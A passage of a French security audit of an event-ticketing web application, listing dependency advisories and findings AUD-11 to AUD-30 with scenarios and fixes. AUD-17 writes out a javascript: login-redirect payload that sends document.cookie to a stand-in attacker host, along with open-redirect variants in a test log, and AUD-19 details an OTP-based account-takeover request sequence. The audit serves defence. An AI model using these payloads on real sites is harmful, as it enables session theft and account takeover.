  next  9.3.4-canary.0 - 16.3.0-preview.10
  Severity: critical
  Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration - https://github.com/advisories/GHSA-9g9p-9gw9-jx7f
  Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components - https://github.com/advisories/GHSA-h25m-26qc-wcjf
  Next.js: HTTP request smuggling in rewrites - https://github.com/advisories/GHSA-ggv3-7p47-pfv8
  Next.js: Unbounded next/image disk cache growth can exhaust storage - https://github.com/advisories/GHSA-3x4c-7xq6-9pq8
  Next.js has a Denial of Service with Server Components - https://github.com/advisories/GHSA-q4gf-8mx6-v5v3
  Next.js Vulnerable to Denial of Service with Server Components - https://github.com/advisories/GHSA-8h8q-6873-q5fj
  Next.js's Middleware / Proxy redirects can be cache-poisoned - https://github.com/advisories/GHSA-3g8h-86w9-wvmq
  Next.js vulnerable to cross-site scripting in App Router applications using CSP nonces - https://github.com/advisories/GHSA-ffhc-5mcf-pf4q
  Next.js vulnerable to cache poisoning via collisions in React Server Component cache-busting - https://github.com/advisories/GHSA-vfv6-92ff-j949
  Next.js has cross-site scripting in beforeInteractive scripts with untrusted input - https://github.com/advisories/GHSA-gx5p-jg67-6x7h
  Next.js has a Denial of Service in the Image Optimization API - https://github.com/advisories/GHSA-h64f-5h5j-jqjh
  Next.js vulnerable to server-side request forgery in applications using WebSocket upgrades - https://github.com/advisories/GHSA-c4j6-fc7j-m34r
  Next.js vulnerable to cache poisoning in React Server Component responses - https://github.com/advisories/GHSA-wfc6-r584-vfw7
  Next.js has a Middleware / Proxy bypass in Pages Router applications using i18n - https://github.com/advisories/GHSA-36qx-fr4f-26g5
  Next.js: Denial of Service in App Router using Server Actions - https://github.com/advisories/GHSA-m99w-x7hq-7vfj
  Next.js: Server-Side Request Forgery in Server Actions on custom servers - https://github.com/advisories/GHSA-89xv-2m56-2m9x
  Next.js: Cache confusion of response bodies for requests with bodies - https://github.com/advisories/GHSA-68g3-v927-f742
  Next.js: Cache confusion of response bodies for requests with bodies containing invalid UTF-8 byte sequences - https://github.com/advisories/GHSA-4633-3j49-mh5q
  Next.js: Unbounded Server Action payload in Edge runtime - https://github.com/advisories/GHSA-4c39-4ccg-62r3
  Next.js: Server-Side Request Forgery in rewrites via attacker-controlled destination hostname - https://github.com/advisories/GHSA-p9j2-gv94-2wf4
  Next.js: Unauthenticated disclosure of internal Server Function endpoints - https://github.com/advisories/GHSA-955p-x3mx-jcvp
  Next.js: Unauthenticated Remote Code Execution on windows-hosted servers - https://github.com/advisories/GHSA-p293-qw3h-jr36
  Next.js: Unauthenticated Remote Code Execution in Image Optimization API when AVIF files are used - https://github.com/advisories/GHSA-2xp9-vwfh-vxw4
  Next.js: Unauthenticated Remote Code Execution in Image Optimization API when SVG files are used - https://github.com/advisories/GHSA-2464-fhr4-w9xw
  Next.js: Denial of Service in App Router using Server Actions - https://github.com/advisories/GHSA-p3m5-59mp-jv5r
  Depends on vulnerable versions of postcss
  fix available via `npm audit fix --force`
  Will install next@16.4.6, which is a breaking change
  node_modules/next
  postcss  <=8.5.22
  Severity: high
  PostCSS has XSS via Unescaped </style> in its CSS Stringify Output - https://github.com/advisories/GHSA-qx2v-qp2m-jg93
  PostCSS: Arbitrary file read and information disclosure via attacker-controlled sourceMappingURL in CSS comments - https://github.com/advisories/GHSA-6g55-p6wh-862q
  PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset - https://github.com/advisories/GHSA-fxqj-rqcc-2cmp
  PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure - https://github.com/advisories/GHSA-r28c-9q8g-f849
  fix available via `npm audit fix --force`
  Will install next@16.4.6, which is a breaking change
  node_modules/next/node_modules/postcss
  sharp  <=0.35.5-rc.1
  Severity: high
  sharp inherited vulnerabilities in libvips: CVE-2026-33327, CVE-2026-33328, CVE-2026-35590, CVE-2026-35591 - https://github.com/advisories/GHSA-f88m-g3jw-g9cj
  sharp: Vulnerabilities in libheif: GHSA-g89c-p67h-r497 and GHSA-2jg2-4ch7-h545 - https://github.com/advisories/GHSA-rgj7-g3m4-5g8c
  sharp : Vulnerability in librsvg dependency CVE-2026-96889 - https://github.com/advisories/GHSA-wq5f-xc86-pv6w
  fix available via `npm audit fix --force`
  Will install sharp@0.35.5, which is a breaking change
  node_modules/sharp
  source-map-js  1.0.0 - 1.2.1
  Severity: high
  source-map-js allows event-loop denial of service through indexed source-map section offsets - https://github.com/advisories/GHSA-68fv-2mgg-jv7q
  fix available via `npm audit fix`
  node_modules/source-map-js
  zod  <4.6.6
  Severity: high
  Zod can exhaust memory while validating oversized constrained collections - https://github.com/advisories/GHSA-mrhx-c7xc-m3w5
  fix available via `npm audit fix --force`
  Will install zod@4.6.7, which is a breaking change
  node_modules/zod
  5 vulnerabilities (4 high, 1 critical)
  To address issues that do not require attention, run:
    npm audit fix
  To address all issues (including breaking changes), run:
    npm audit fix --force
  ```
- **Correctif recommandé** : Next.js 14 → dernière 15.x prise en charge (ou 14.2.x la plus récente si une correction y est
  publiée), `sharp` ≥ 0.35.5, `zod` selon l'avis ; relire chaque avis contre l'usage (`next/image` avec Supabase Storage,
  `images.formats`) ; `npm audit --omit=dev` en CI.
- **Effort** : 1 à 3 jours (montée de Next.js et revalidation).

### AUD-11 — En-têtes de sécurité incomplets (ni CSP, ni HSTS, ni Permissions-Policy)

- **Gravité** : FAIBLE · **Catégorie** : A05:2021 Security Misconfiguration
- **Statut** : PROUVÉ par lecture
- **Constat** : `next.config.mjs:51-92` pose `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`,
  `Referrer-Policy` ; aucune `Content-Security-Policy`, aucun `Strict-Transport-Security`, aucune `Permissions-Policy`
  (caméra du scanner) ; `middleware.ts` n'en ajoute pas. Les cookies de session de `@supabase/ssr` sont posés avec `httpOnly: false`, sans `secure` explicite et pour
  400 jours (`node_modules/@supabase/ssr/dist/main/utils/constants.js:4-10`, options par défaut que l'application ne
  change pas) ; le middleware recopie les cookies sans leurs options lors d'une redirection (`middleware.ts:159`). Sans
  CSP, toute XSS donne la session : c'est exactement AUD-17. Aucun
  `dangerouslySetInnerHTML` sur une donnée saisie (seul `app/layout.tsx:66`, script de thème constant).
- **Correctif recommandé** : CSP stricte avec nonce (`script-src 'self' 'nonce-…'`, `connect-src` limité à Supabase),
  HSTS `max-age=63072000; includeSubDomains`, `Permissions-Policy: camera=(self), geolocation=()`.
- **Effort** : 4 h (CSP à éprouver sur tous les écrans).

### AUD-12 — `PATCH /api/controller/profile` : compte suspendu admis et essais de mot de passe sans quota

- **Gravité** : FAIBLE · **Catégorie** : A07:2021 ; API2:2023
- **Statut** : PROUVÉ par lecture
- **Constat** : la route utilise `getServerSessionUser` sans contrôle du statut (`app/api/controller/profile/route.ts:91-95`),
  vérifie le mot de passe actuel par `signInWithPassword` (`:143`) sans quota applicatif, puis le remplace par le
  service_role. Un contrôleur SUSPENDU (jeton encore valide) change son mot de passe ; un voleur de session essaie des
  mots de passe sans limite autre que celle de GoTrue (qu'il consomme pour tous, AUD-08). La règle de longueur y est plus faible que celle de `account/password`. Les trois autres routes à
  `getServerSessionUser` (`auth/me`, `controller/assignments`, `push/subscriptions` en DELETE) ne font que lire ou
  retirer ; `controller/assignments` sert ainsi ses affectations à un contrôleur suspendu (`app/api/controller/assignments/route.ts:73`).
  Rappel d'un constat déjà connu (G-97 du guide) : un contrôleur invité par un numéro neuf est ACTIF, a le rôle et
  l'affectation avant toute activation (`app/api/partner/team/invite/route.ts:384`, `:402`, `:452`).
  Atténuation relevée par le lecteur « comptes » : pour une session portée par cookies, le middleware refuse déjà un
  compte SUSPENDU sur `/api/controller/*` (`middleware.ts:240-257`) ; le trou reste ouvert avec un jeton Bearer.
- **Correctif recommandé** : `requireActiveSession`, et même garde que `app/api/account/password/route.ts`
  (`verifyAccountPassword`, quota par compte).
- **Effort** : 1 h.

### AUD-13 — Une invitation sans nom se valide à la porte avec les 4 derniers chiffres du numéro de l'invité

- **Gravité** : MOYENNE · **Catégorie** : A04:2021 Insecure Design, A07:2021 ; API6:2023 Unrestricted Access to Sensitive Business Flows
- **Statut** : PROUVÉ par lecture (relevé par le lecteur « billets », revérifié)
- **Scénario** : le partenaire invite un numéro sans saisir de nom (le nom est facultatif :
  `supabase/migrations/20261110000008_lot9ter_invites.sql:31-34`). Un inconnu se présente à la porte : « je suis
  invité, mon numéro finit par 1234 ». Le contrôleur cherche les 4 derniers chiffres (`ticket_guest_list_search`, forme
  `LAST4`, `:86-88`, filtre `right(numéro, 4) = suffixe`, `:125`) et valide l'invitation non réclamée. La seule garde est
  la case « pièce d'identité vérifiée » (`20261110000009_lot9ter_zones.sql:1066-1072`), qu'aucun nom ne permet de
  comparer : la porte affiche « Invité » (`:1108`). L'invité légitime arrive ensuite : « déjà utilisé ». Les 4 derniers
  chiffres d'un numéro se trouvent sur un reçu, une capture ou une conversation.
- **Correctif recommandé** : exiger le numéro complet quand l'invitation n'a pas de nom, ou rendre le nom obligatoire
  pour toute invitation validable par la liste ; montrer au contrôleur le nombre de correspondances et le numéro masqué.
- **Effort** : 2 h.

### AUD-14 — Zones de contrôle (VIP) sans anti-retour : un billet utilisé passe à chaque fois

- **Gravité** : MOYENNE · **Catégorie** : A04:2021 Insecure Design ; API6:2023
- **Statut** : PROUVÉ par lecture (relevé par le lecteur « billets », revérifié)
- **Scénario** : à une porte de zone de type CONTROLE (ex. espace VIP), un billet au statut `UTILISE` reçoit
  `zone_ok` (`20261110000009_lot9ter_zones.sql:1135-1166` ; `scan_zone_verdict`, `:268-270`) et rien n'est composté
  (« jamais de compostage », `:1133-1134`). Le porteur d'un billet VIP entré une fois donne ses codes hors ligne (valables
  48 h, toujours calculables après l'entrée : `20261105000004_lot7_billet_hors_ligne.sql:101`) ou son numéro de billet
  (saisie manuelle) à des amis entrés avec un billet Standard : chacun passe la zone VIP avec le même billet.
- **Correctif recommandé** : marquer la présence dans la zone (entrée/sortie) et refuser un second `zone_ok` tant que le
  billet n'est pas ressorti, ou au minimum signaler au contrôleur « déjà passé dans cette zone à HH:MM ».
- **Effort** : 4 h.

### AUD-15 — Un ADMIN sans aucune permission scanne et ouvre une caisse sur n'importe quel événement

- **Gravité** : FAIBLE · **Catégorie** : A01:2021 ; API5:2023 Broken Function Level Authorization
- **Statut** : PROUVÉ par lecture
- **Constat** : `scan_scanner_authorized` accepte tout compte ACTIF ayant le rôle ADMIN ou SUPERADMIN
  (`supabase/migrations/20261101000010_lot4_scan.sql:70`), sans lire `admin_permissions` ; même règle pour la caisse
  (`20261101000011_lot4_caisse.sql:55`). Un administrateur créé pour la seule lecture des statistiques peut composter
  des billets et encaisser des espèces sur tout événement.
- **Correctif recommandé** : permission dédiée (`access.operate`) relue dans ces deux fonctions.
- **Effort** : 1 h.

### AUD-16 — Un seul PIN régisseur par événement, saisi sur le téléphone du contrôleur qui en a besoin pour couvrir son propre écart

- **Gravité** : FAIBLE · **Catégorie** : A04:2021 Insecure Design (séparation des tâches)
- **Statut** : PROUVÉ par lecture pour la règle ; capture du PIN SUPPOSÉE
- **Constat** : le PIN est unique par événement (`lib/shifts/shift.service.ts:266-273`) et il est la seule
  co-signature d'une clôture de caisse en écart (`:405-415`). Le régisseur le tape sur l'appareil du contrôleur
  (`components/shifts/ShiftModals.tsx:139`) : un contrôleur qui l'a vu une fois justifie seul, plus tard, un écart
  de caisse sur n'importe quelle caisse de l'événement.
- **Correctif recommandé** : validation d'écart par le compte du régisseur (son appareil, sa session) ou PIN par caisse à
  usage unique.
- **Effort** : 4 h.

### AUD-17 — `/login?redirect=javascript:…` exécute du code dans le site après la connexion : prise de compte par un simple lien

- **Gravité** : CRITIQUE · **Catégorie** : A03:2021 Injection (XSS par le DOM), A01:2021 (redirection ouverte) ; API8:2023 Security Misconfiguration
- **Statut** : PROUVÉ (test rouge `tests/audit/aud-17-redirection-connexion.test.ts` ; relevé par le lecteur « navigateur », revérifié)
- **Scénario** :
  1. L'attaquant envoie à une victime (SMS, WhatsApp) un vrai lien du site :
     `https://<site>/login?redirect=javascript:fetch('https://attaquant.example/?c='+encodeURIComponent(document.cookie))`.
  2. La victime se connecte normalement. `app/login/page.tsx:22` lit `redirect` tel quel ;
     `components/auth/LoginForm.tsx:301-304` fait `window.location.href = resolvePostLoginRoute(roles, redirectUrl)` ;
     `lib/auth/resolve-post-login-route.ts:5` et `:20` rendent la cible brute dès qu'elle n'est pas « / ». Même chose
     après une connexion par code : `LoginForm.tsx:492` (`window.location.href = redirectUrl || '/'`).
  3. Le code s'exécute dans l'origine du site. Les cookies de session de `@supabase/ssr` sont lisibles en JavaScript
     (`httpOnly: false`, AUD-11) : l'attaquant reçoit la session de la victime. Avec AUD-02, il change ensuite le mot
     de passe sans alerte. Il n'a besoin d'aucun compte.
  4. Variante : `redirect=https://faux-site.example/` envoie la victime, connectée, vers un site d'hameçonnage.
  La page d'inscription filtre la même entrée (`safeInternalPath`, `app/register/page.tsx:44-48`, `:148`) ; la page de
  connexion ne le fait pas. Aucune CSP n'atténue (AUD-11).
- **Preuve (sortie brute du run 142)** :
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-17-redirection-connexion.test.ts.log` :
  ```text
  [AUD-17] rôles CLIENT ; redirect="javascript:fetch(\"https://attaquant.example/?c=\"+encodeURIComponent(document.cookie))" → "javascript:fetch(\"https://attaquant.example/?c=\"+encodeURIComponent(document.cookie))"
  [AUD-17] rôles PARTENAIRE ; redirect="javascript:fetch(\"https://attaquant.example/?c=\"+encodeURIComponent(document.cookie))" → "javascript:fetch(\"https://attaquant.example/?c=\"+encodeURIComponent(document.cookie))"
  [AUD-17] rôles ADMIN ; redirect="javascript:fetch(\"https://attaquant.example/?c=\"+encodeURIComponent(document.cookie))" → "javascript:fetch(\"https://attaquant.example/?c=\"+encodeURIComponent(document.cookie))"
  [AUD-17] rôles CLIENT ; redirect="JavaScript:alert(document.domain)" → "JavaScript:alert(document.domain)"
  [AUD-17] rôles PARTENAIRE ; redirect="JavaScript:alert(document.domain)" → "JavaScript:alert(document.domain)"
  [AUD-17] rôles ADMIN ; redirect="JavaScript:alert(document.domain)" → "JavaScript:alert(document.domain)"
  [AUD-17] rôles CLIENT ; redirect="https://attaquant.example/connexion" → "https://attaquant.example/connexion"
  [AUD-17] rôles PARTENAIRE ; redirect="https://attaquant.example/connexion" → "https://attaquant.example/connexion"
  [AUD-17] rôles ADMIN ; redirect="https://attaquant.example/connexion" → "https://attaquant.example/connexion"
  [AUD-17] rôles CLIENT ; redirect="//attaquant.example/connexion" → "//attaquant.example/connexion"
  [AUD-17] rôles PARTENAIRE ; redirect="//attaquant.example/connexion" → "//attaquant.example/connexion"
  [AUD-17] rôles ADMIN ; redirect="//attaquant.example/connexion" → "//attaquant.example/connexion"
  [AUD-17] rôles CLIENT ; redirect="/\\attaquant.example" → "/\\attaquant.example"
  [AUD-17] rôles PARTENAIRE ; redirect="/\\attaquant.example" → "/\\attaquant.example"
  [AUD-17] rôles ADMIN ; redirect="/\\attaquant.example" → "/\\attaquant.example"
      not ok 1 - une destination hostile est remplacée par un chemin interne, quel que soit le rôle
        error: |-
          15 destination(s) hostile(s) rendue(s) telles quelles et affectées à window.location.href par LoginForm
          + actual - expected
  
          + [
          +   'CLIENT javascript:fetch("https://attaquant.example/?c="+encodeURIComponent(document.cookie))',
          +   'PARTENAIRE javascript:fetch("https://attaquant.example/?c="+encodeURIComponent(document.cookie))',
          +   'ADMIN javascript:fetch("https://attaquant.example/?c="+encodeURIComponent(document.cookie))',
          +   'CLIENT JavaScript:alert(document.domain)',
          +   'PARTENAIRE JavaScript:alert(document.domain)',
          +   'ADMIN JavaScript:alert(document.domain)',
          +   'CLIENT https://attaquant.example/connexion',
          +   'PARTENAIRE https://attaquant.example/connexion',
          +   'ADMIN https://attaquant.example/connexion',
          +   'CLIENT //attaquant.example/connexion',
          +   'PARTENAIRE //attaquant.example/connexion',
          +   'ADMIN //attaquant.example/connexion',
          +   'CLIENT /\\attaquant.example',
          +   'PARTENAIRE /\\attaquant.example',
          +   'ADMIN /\\attaquant.example'
          + ]
          - []
  
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected:
        actual:
          0: 'CLIENT javascript:fetch("https://attaquant.example/?c="+encodeURIComponent(document.cookie))'
          1: 'PARTENAIRE javascript:fetch("https://attaquant.example/?c="+encodeURIComponent(document.cookie))'
          2: 'ADMIN javascript:fetch("https://attaquant.example/?c="+encodeURIComponent(document.cookie))'
          3: 'CLIENT JavaScript:alert(document.domain)'
          4: 'PARTENAIRE JavaScript:alert(document.domain)'
          5: 'ADMIN JavaScript:alert(document.domain)'
          6: 'CLIENT https://attaquant.example/connexion'
          7: 'PARTENAIRE https://attaquant.example/connexion'
          8: 'ADMIN https://attaquant.example/connexion'
          9: 'CLIENT //attaquant.example/connexion'
          10: 'PARTENAIRE //attaquant.example/connexion'
          11: 'ADMIN //attaquant.example/connexion'
          12: 'CLIENT /\\attaquant.example'
          13: 'PARTENAIRE /\\attaquant.example'
          14: 'ADMIN /\\attaquant.example'
        operator: 'deepStrictEqual'
  not ok 1 - AUD-17 — destination après connexion (paramètre redirect de /login)
  ```
- **Correctif recommandé** : passer `redirect` par `safeInternalPath` dans `resolvePostLoginRoute` et dans
  `LoginForm.tsx:492` (chemin commençant par un seul « / », sans « \ », sans schéma) ; CSP sans `unsafe-inline` (AUD-11).
- **Effort** : 1 h.

### AUD-18 — Les SMS « indispensables » échappent au plafond global : transferts offerts puis annulés en boucle

- **Gravité** : MOYENNE · **Catégorie** : API4:2023 Unrestricted Resource Consumption, API6:2023
- **Statut** : PROUVÉ par lecture (relevé par le lecteur « coûts », revérifié)
- **Scénario** : `TRANSFER_OFFERED` et `TRANSFER_CANCELLED` sont de la famille ESSENTIAL avec SMS
  (`supabase/migrations/20261109000003_lot9bis_registre.sql:101-102`) ; une famille ESSENTIAL n'est jamais soumise au
  plafond global (`lib/sms/sms-guard.ts:105`). `POST /api/tickets/[id]/transfer` n'a aucun quota propre (seul le mot de
  passe récent est exigé, `app/api/tickets/[id]/transfer/route.ts:32`) ; l'offre met un SMS en file vers le numéro
  choisi (`20261109000008_lot9bis_cycle.sql:1484-1488`). Restent 30 SMS par jour et par compte (`SMS_PER_ACCOUNT_DAY`,
  `lib/env.ts:64`) et 30 par destinataire (`SMS_PER_PHONE_DAY`, `:61`). Chaque compte gratuit d'AUD-03 qui tient un
  billet gratuit coûte donc jusqu'à 30 SMS par jour à Event Village, sans plafond d'ensemble ; un tiers reçoit jusqu'à
  30 SMS par jour qu'il n'a pas demandés.
- **Correctif recommandé** : quota par compte et par billet sur les transferts (ex. 3 offres par billet et par jour) ;
  plafond global distinct pour les SMS ESSENTIAL déclenchés par un client.
- **Effort** : 2 h.

### AUD-19 — GoTrue envoie un code de connexion à l'adresse technique `<numéro>@eventvillage.sn` de chaque compte

- **Gravité** : ÉLEVÉE (CRITIQUE si la boîte du domaine est lisible par un tiers) · **Catégorie** : A07:2021 ; API2:2023 Broken Authentication
- **Statut** : PROUVÉ pour l'émission du code (test rouge `tests/audit/aud-19-code-email-adresse-technique.test.ts`) ;
  exploitation SUPPOSÉE (lecture de la boîte du domaine, ou force brute répartie). Relevé par le lecteur « comptes », revérifié.
- **Scénario** : l'identifiant GoTrue de tout compte inscrit par l'application est `<numéro sans +>@eventvillage.sn`
  (`lib/auth/account-sync.ts:16-17`, `app/api/auth/register/route.ts:166-177`, email confirmé d'office), déductible du
  numéro. Le fournisseur email est actif (`docs/deploiement-projet-neuf.md:22`). Avec la clé anon,
  `POST /auth/v1/otp {"email": "<numéro>@eventvillage.sn", "create_user": false}` (ou `/auth/v1/recover`) envoie à
  cette adresse un code à 6 chiffres valable une heure (`supabase/config.toml:212-213`), qui ouvre une session par
  `POST /auth/v1/verify`. Dans la CI, GoTrue répond 200 et le message arrive dans la boîte locale avec un lien de
  connexion (modèle par défaut, sans le code en clair) : qui lit la boîte n'a qu'à cliquer. Deux voies : quiconque lit la boîte du domaine (adresse « attrape-tout », prestataire de
  messagerie, employé) prend n'importe quel compte ; sinon, la seule limite contre la force brute est
  `token_verifications` par IP (`supabase/config.toml:186`, 30 par 5 minutes), soit environ 360 essais par heure et
  par IP pour un million de codes, à la portée d'un attaquant qui loue des adresses IP. La session obtenue, AUD-02 rend
  la prise définitive. L'application ne se sert jamais de ces codes email pour les comptes à numéro.
- **Preuve (sortie brute du run 142)** :
  Journal `runs/142-43360987642/test-logs/tests__audit__aud-19-code-email-adresse-technique.test.ts.log` :
  ```text
  [AUD-19] POST /auth/v1/otp {email: 221775938734@eventvillage.sn, create_user: false} (clé anon seule) : HTTP 200 {}
  [AUD-19] illustration (lecture de la boîte du domaine) : message sans code à 6 chiffres ; session : non essayée
      not ok 1 - GoTrue n'émet aucun code de connexion pour l'adresse technique <numéro>@eventvillage.sn
        error: 'GoTrue a émis un code de connexion par email pour 221775938734@eventvillage.sn, adresse technique déductible du numéro du compte'
        code: 'ERR_ASSERTION'
        name: 'AssertionError'
        expected: 200
        actual: 200
        operator: 'notStrictEqual'
  not ok 1 - AUD-19 — code de connexion GoTrue envoyé à l'adresse technique d'un compte inscrit par son numéro
  ```
- **Correctif recommandé** : donner aux comptes à numéro une adresse technique non routable (domaine `.invalid` ou
  sous-domaine sans MX) ; refuser `/auth/v1/otp` et `/auth/v1/recover` pour le domaine technique par un hook
  « Send Email » ; abaisser `token_verifications`.
- **Effort** : 4 h + migration des adresses existantes.

### AUD-20 — Un client fait rembourser intégralement des paiements aux frais d'Event Village, en boucle

- **Gravité** : MOYENNE · **Catégorie** : API6:2023 Unrestricted Access to Sensitive Business Flows
- **Statut** : PROUVÉ par lecture (relevé par le lecteur « argent », revérifié)
- **Scénario** : le client lance un paiement A puis l'annule dans l'application : l'annulation est locale
  (`app/api/payments/[transactionId]/cancel/route.ts:97`, `releasePayment`), le lien SamirPay reste payable. Il achète
  le même panier par B, puis paie A : le succès tardif de A est un doublon et part en remboursement intégral
  (`supabase/migrations/20261106000003_lot8_paiement.sql:190`), frais d'agrégateur et de transfert à la charge
  d'Event Village (`20261101000005_lot3_remboursements.sql:230-231`, type `REFUND`). C'est la règle voulue au lot 8
  (L31) ; elle n'a ni borne ni coût pour le client, qui peut la répéter et faire payer à la plateforme les frais de
  chaque aller-retour.
- **Correctif recommandé** : annuler aussi la transaction chez SamirPay quand l'API le permet ; à défaut, frais du
  remboursement d'un doublon à la charge du client au-delà du premier, et alerte à partir de deux doublons par compte et par mois.
- **Effort** : 3 h.

### AUD-21 — Accaparement du stock : des paniers non payés bloquent les places de tout un événement

- **Gravité** : MOYENNE · **Catégorie** : API6:2023
- **Statut** : PROUVÉ par lecture (relevé par les lecteurs « argent » et « coûts », revérifié)
- **Scénario** : chaque panier garde ses places 10 minutes (`finance.payment_hold_minutes`,
  `20261109000001_lot9bis_reglages.sql:33`), jusqu'à 20 catégories par panier (`lib/payments/checkout.service.ts:36-39`) ;
  la seule limite est par compte (10 paniers par 15 minutes, 50 par jour, `lib/env.ts:72-73`). Annuler puis relancer
  renouvelle la garde. Avec les comptes gratuits d'AUD-03, un concurrent ou un revendeur tient les places d'un événement
  pendant des heures ; chaque panier envoie en outre une demande de paiement SamirPay vers un numéro payeur libre (AUD-27).
- **Correctif recommandé** : quota par événement et par numéro payeur ; garde plus courte au-delà d'un seuil de places ;
  compte à numéro vérifié exigé (AUD-03).
- **Effort** : 4 h.

### AUD-22 — Un ADMIN qui n'a que `pricing.manage` ouvre les services réservés au SUPERADMIN

- **Gravité** : MOYENNE · **Catégorie** : A01:2021 ; API5:2023 Broken Function Level Authorization
- **Statut** : PROUVÉ par lecture (relevé par deux lecteurs, revérifié)
- **Constat** : `POST /api/admin/pricing` (`app/api/admin/pricing/route.ts:42`, permission `pricing.manage`) refuse
  seulement les clés `finance.*`, `access.*` et `notif.*` (`:60-68`) puis écrit toute autre clé de `platform_settings`
  sans validation ni historique (`:82`), dont `features.*` (salles, tables, commandes), réservées au SUPERADMIN selon
  `20261105000001_lot7_reglages.sql:21`. Il ouvre ainsi des paiements sur des modules non audités (AUD-28).
- **Correctif recommandé** : liste blanche des clés tarifaires ; `features.*` par une route SUPERADMIN historisée.
- **Effort** : 1 h.

### AUD-23 — Un ADMIN qui a `users.write` anonymise et bannit un autre ADMIN ou une partenaire

- **Gravité** : MOYENNE · **Catégorie** : A01:2021 ; API5:2023
- **Statut** : PROUVÉ par lecture (relevé par le lecteur « routes », revérifié)
- **Constat** : `AdminService.anonymizeUser` ne protège que la cible SUPERADMIN, lue dans l'ancienne colonne `users.role`
  et non dans `user_roles` (`lib/admin/admin.service.ts:326-327`), puis bannit 100 ans (`:348`). Un ADMIN muni de
  `users.write` (`app/api/admin/users/[id]/anonymize/route.ts:17`) efface un autre administrateur, ou une partenaire
  dont les événements continuent de vendre.
- **Correctif recommandé** : cible ADMIN ou PARTENAIRE réservée au SUPERADMIN, rôles lus dans `user_roles`.
- **Effort** : 1 h.

### AUD-24 — Un ADMIN qui porte aussi le rôle PARTENAIRE échappe à `events.write` sur les routes d'équipe

- **Gravité** : MOYENNE · **Catégorie** : A01:2021 ; API5:2023
- **Statut** : PROUVÉ par lecture (relevé par le lecteur « routes », revérifié)
- **Constat** : `adminTeamRefusal` ne vérifie aucune permission quand l'appelant est ADMIN et PARTENAIRE
  (`app/api/partner/team/team-access.ts:14`) ; `team/controller/[controllerId]` prend alors le partenaire du paramètre
  `partnerId` (`app/api/partner/team/controller/[controllerId]/route.ts:65-66`) : retrait des contrôleurs de n'importe
  quel partenaire, révocation de leur rôle, changement de point d'entrée (`team/[eventId]/route.ts:128`,
  `team/entry-point/route.ts:50`). Un ADMIN `users.write` peut s'ajouter lui-même le rôle PARTENAIRE.
- **Correctif recommandé** : vérifier la permission admin dès que la ressource n'appartient pas au partenaire de l'appelant.
- **Effort** : 1 h.

### AUD-25 — Dépôts anonymes de pièces de 10 Mo, jamais purgés

- **Gravité** : MOYENNE · **Catégorie** : API4:2023 Unrestricted Resource Consumption
- **Statut** : PROUVÉ par lecture (relevé par le lecteur « routes », revérifié)
- **Constat** : `POST /api/partner/documents/upload` est public, accepte 10 Mo (`route.ts:16`), 20 dépôts par heure et
  par IP (`lib/env.ts:68`, IP falsifiable : AUD-09), dans `pending/<uuid>/` (`lib/partners/documents.ts:37`) ; le jeton
  de rattachement expire en 2 h (`:17`) mais aucune purge des fichiers non rattachés n'existe (aucune suppression dans
  les migrations ni dans `app/api/cron/*`). Soit 200 Mo par heure et par adresse, sans fin.
- **Correctif recommandé** : purge planifiée des dépôts non rattachés après 24 h ; quota global journalier.
- **Effort** : 2 h.

### AUD-26 — Une partenaire validée change le titre ou le lieu et fait envoyer son texte par SMS à tous les porteurs

- **Gravité** : MOYENNE · **Catégorie** : A04:2021 ; API6:2023 (hameçonnage par l'expéditeur officiel)
- **Statut** : PROUVÉ par lecture (relevé par le lecteur « coûts », revérifié)
- **Constat** : après validation, l'édition d'un événement publié reste libre (titre, lieu, dates :
  `supabase/migrations/20261109000009_lot9bis_messages.sql:505`, `:656-662`) sans nouvelle modération, et déclenche
  `EVENT_CHANGED` (ESSENTIAL, SMS : `20261109000003_lot9bis_registre.sql:88`) vers chaque porteur (`:776-778`) avec le
  titre et le lieu saisis (`lib/notifications/catalog.ts:447-448`) ; `smsVar` tronque et translittère mais ne retire pas
  un lien (`lib/notifications/sms-format.ts:139-145`). Un compte partenaire compromis (AUD-02, AUD-17) envoie donc
  « Event Village : <texte avec lien> » à tous les acheteurs, hors plafond global.
- **Correctif recommandé** : refuser URL et numéros dans titre et lieu ; changement de titre ou de lieu d'un événement
  publié soumis à l'administration ; un seul avis groupé par événement et par jour.
- **Effort** : 3 h.

### AUD-27 — Numéro payeur libre

- **Gravité** : FAIBLE · **Précision** : A04
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues) ; part SUPPOSÉE indiquée
- **Constat** : tout numéro sénégalais est accepté comme payeur (`lib/payments/payer-phone.ts:10-13`), sans lien avec le compte ; un client fait envoyer des demandes de paiement SamirPay à des tiers, et le remboursement part vers ce numéro. Comportement de l'opérateur (qui peut payer un lien) SUPPOSÉ.
- **Correctif recommandé** : quota par numéro payeur ; avertissement quand il diffère du numéro du compte ; remboursement vers le numéro qui a réellement payé (référence opérateur).
- **Effort** : 2 h.

### AUD-28 — Paiements hors billetterie

- **Gravité** : FAIBLE · **Précision** : modules fermés par défaut
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : premier paiement d'une salle sur le solde puis réservation confirmée, ni idempotence ni détection de doublon, plan d'abonnement inactif encore achetable (`lib/payments/payment.service.ts:104`, `:140` ; `confirmation.service.ts:92`). À corriger avant toute ouverture (AUD-22).
- **Correctif recommandé** : idempotence et détection de doublon sur `payments/create`, acompte encaissé avant le solde, plan inactif refusé, à faire avant toute ouverture des modules.
- **Effort** : 1 jour.

### AUD-29 — Initialisation SamirPay deux fois hors délai

- **Gravité** : FAIBLE
- **Statut** : SUPPOSÉ (relevé par une lecture parallèle, lignes relues)
- **Constat** : le paiement passe FAILED sans identifiant SamirPay et la réconciliation ne relit que ceux qui en ont un (`app/api/cron/payments-reconcile/route.ts:50-53`) ; si le webhook manque, un client débité n'a ni billet ni remboursement automatique.
- **Correctif recommandé** : surveiller aussi les paiements FAILED sans identifiant (recherche par `external_order_id` chez SamirPay) pendant 48 h.
- **Effort** : 3 h.

### AUD-30 — Auto-parrainage avec un second numéro

- **Gravité** : FAIBLE
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
